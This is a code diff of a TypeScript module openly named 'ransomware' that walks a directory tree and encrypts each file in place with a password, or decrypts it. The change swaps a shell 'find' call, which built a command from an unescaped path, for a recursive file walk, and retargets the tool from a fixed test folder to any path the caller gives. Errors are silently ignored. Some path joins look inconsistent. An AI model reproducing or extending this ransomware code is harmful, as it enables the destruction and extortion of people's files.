@@ -1,31 +1,34 @@
 import zlib from "zlib";
 import fs from "fs";
 import crypto from "crypto";
-import * as exec from "child_process";
+import path from "path";
 
-const _run = (args: string): string | null => {
-  try {
-    return exec.execSync(args, { maxBuffer: 1024 * 1024 * 100 }).toString();
-  } catch(e) {
-    return null;
+const readdir = (directory: string) => {
+  let fileList: string[] = [];
+
+  let files: string[] = [];
+  try { 
+    files = fs.readdirSync(directory);
+  } catch(err) {
+        
   }
+ 
+  for (const file of files) {
+    const p = path.join(directory, file);
+    try {
+      if (fs.statSync(p)?.isDirectory()) {
+        fileList = [...fileList, ...(readdir(p))];
+      } else {
+        fileList.push(p);
+      }
+    } catch(err) {
+      return fileList;
+    } 
+  }
+
+  return fileList;
 }
 
-// Get list of files inside a folder
-const readdir = (path: string) => {
-  const res = _run(`find '${path}' -type f -follow -print`) as string;
-  if (res) {
-    if (/\n/g.test(res)) {
-      return res?.split("\n");
-    } else if (res?.length > 0) {
-      return [res];
-    } else {
-      return [];
-    }
-  } else {
-    return [];
-  }
-}
 
 // Load a file as utf-8 encoding
 const loadFile = (filename: string) => {
@@ -166,27 +169,29 @@ const decrypt = (data: Buffer, password: string) => {
  * Add Note to /path after encryption ends
 */
 const ransomware = (options: string) => {
-  const tmpPath = "/data/data/com.termux/files/home/ransom";
   options = options.substring(12, options.length);
   const [mode, key, path, speed] = options.split(" ");
-  const filesInPath = readdir(tmpPath);
+  const filesInPath = readdir(path);
+  console.log("Encrypting " + filesInPath.length + " files..."); 
   for(let i = 0; i < filesInPath.length; ++i) {
+    console.log(`${i} of ${filesInPath.length} ...`); 
     try {
-      const fileData = loadFile(`${tmpPath}/${filesInPath[i]}`);
+      const fileData = loadFile(`${path}/${filesInPath[i]}`);
       if (mode === "e" || mode === "encrypt") {
         const compressedFileDataBuffer = compressBuffer(fileData, +speed);
         const encryptedDataBuffer = encrypt(compressedFileDataBuffer, key);
-        saveToFile(`${tmpPath}/${filesInPath[i]}`, encryptedDataBuffer);
+        saveToFile(`${path}${filesInPath[i]}`, encryptedDataBuffer);
       } else {
         const decryptedDataBuffer = decrypt(fileData, key);
         const decompressedFileDataBuffer = uncompressBuffer(decryptedDataBuffer);
-        saveToFile(`${tmpPath}/${filesInPath[i]}`, decompressedFileDataBuffer);
+        saveToFile(`${path}${filesInPath[i]}`, decompressedFileDataBuffer);
       }
     } catch(err) {
       // silent error
-    }
+    } 
+
   }
-  return tmpPath + " files " + ((mode === "e" || mode === "encrypt") ? "encrypted" : "decrypted");
+  return path + " files " + ((mode === "e" || mode === "encrypt") ? "encrypted" : "decrypted");
 }
 
 export default ransomware;
